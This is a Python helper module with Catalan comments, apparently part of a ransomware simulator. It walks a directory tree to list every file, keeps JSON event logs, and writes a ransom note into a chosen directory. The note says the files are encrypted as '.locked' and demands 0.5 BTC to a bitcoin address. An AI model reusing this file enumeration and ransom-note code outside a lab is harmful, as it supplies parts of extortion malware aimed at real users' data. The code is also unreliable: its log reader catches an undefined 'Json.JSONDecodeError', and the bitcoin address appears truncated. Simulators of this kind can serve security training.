import json
import os
from datetime import datetime
import config


def llistar_fitxers(ruta: str) -> list[str]:
#Recorre recursivament un directori i retorna una llista de rutes completes
#Argument: El directori arrel per a cercar
#Return: Una llista amb totes les rutes dels fitxers trobats dins del directori
    llista_final = []

    if os.path.exists(ruta):
        for arrel, directoris, fitxers in os.walk(ruta):
            for nom in fitxers:
                llista_final.append(os.path.join(arrel, nom))
        return llista_final
    return []

def registrar_log(event: str, nivell: str, dades_extra = None) -> None:
#Registra un esdeveniment al fitxer de logs amb marca de temps
    ruta_logs = config.FILE_LOGS
    carpeta_logs = os.path.dirname(ruta_logs)


    os.makedirs(carpeta_logs, exist_ok=True)

    entrada_log = {
        "timestamp": datetime.now().isoformat(),
        "level": nivell,
        "event": event,
    }

    if dades_extra:
        entrada_log.update(dades_extra)

    with open(config.FILE_LOGS, "a", encoding = "utf-8") as file:
        file.write(json.dumps(entrada_log) + "\n")

def llegir_logs() -> None:
#Mostra el contingut del fitxer de logs per consola

    if os.path.exists(config.FILE_LOGS):

        with open(config.FILE_LOGS, "r", encoding="utf-8") as file:
            for linia in file:
                try: #Try afegit per a evitar errors en cas de linies buides al fitxer
                    dades = json.loads(linia)
                    print(f"[{dades['timestamp']}] {dades['event']}: {dades.get('path', '')} - {dades['level']}")
                except Json.JSONDecodeError:
                    continue
    else:
        print("No hi ha logs disponibles.")

def generar_nota_rescat(directori: str) -> None:
#Crea un fitxer de text amb les instruccions de rescat al directori indicat
    contingut = (
        "HEM XIFRAT ELS TEUS FITXERS!\n\n"
        "Per recuperar les teves dades, necessites la clau de desxifratge.\n"
        "1. No intentis modificar els fitxers .locked.\n"
        "2. Envia 0.5 BTC a l'adreca: bc1qxy2kgdy6jrsqx7644vvv\n"
        "3. Un cop pagat, envia un correu a: support@simulador.com\n"
    )

    ruta_nota = os.path.join(directori, "INSTRUCCIONS_RECUPERACIO.txt")
    
    try:

        with open(ruta_nota, "w", encoding="utf-8") as f:
            f.write(contingut)

        print(f"[+] Nota de rescat creada a: {ruta_nota}")

    except Exception as e:
        print(f"[X] ERROR CREANT LA NOTA: {e}")
